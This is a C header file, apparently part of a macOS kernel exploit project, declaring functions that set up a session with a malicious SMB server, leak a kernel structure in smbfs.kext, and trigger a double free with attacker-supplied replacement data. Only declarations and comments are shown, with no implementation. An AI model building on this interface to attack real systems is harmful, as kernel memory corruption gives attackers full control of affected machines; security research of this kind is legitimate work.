//
//  zfree_kext.h
//  kmem_xepg
//
//  Created by admin on 12/20/21.
//

#ifndef zfree_kext_h
#define zfree_kext_h

#include <stdio.h>
#include <xpl/slider/kext.h>
#include <smbfs/smb2_mc.h>

typedef struct xpl_kheap_free_session* xpl_kheap_free_session_t;

/// Create a new double free session
/// @param smb_addr socket address of xpl_smbx server
xpl_kheap_free_session_t xpl_kheap_free_session_create(const struct sockaddr_in* smb_addr);

/// Allocate and leak a `struct complete_nic_info_entry` which can be used for double free
/// @param session `xpl_kheap_free_session_t` created using `xpl_kheap_free_session_create`
struct complete_nic_info_entry xpl_kheap_free_session_prepare(xpl_kheap_free_session_t session);

/// Trigger the double free of NIC with index `entry->nic_index`
/// @param session `xpl_kheap_free_session_t` created using `xpl_kheap_free_session_create`
/// @param entry Replacement data for the `struct complete_nic_info_entry` leaked by
///             `xpl_kheap_free_session_prepare`
void xpl_kheap_free_session_execute(xpl_kheap_free_session_t session, const struct complete_nic_info_entry* entry);

/// Release resources. This method should be called only after kmem backend is initialized
/// @param session_p  Pointer to`xpl_kheap_free_session_t` created using `xpl_kheap_free_session_create`
/// @param slider Slider for smbfs.kext
void xpl_kheap_free_session_destroy(xpl_kheap_free_session_t* session_p, xpl_slider_kext_t slider);

#endif /* zfree_kext_h */
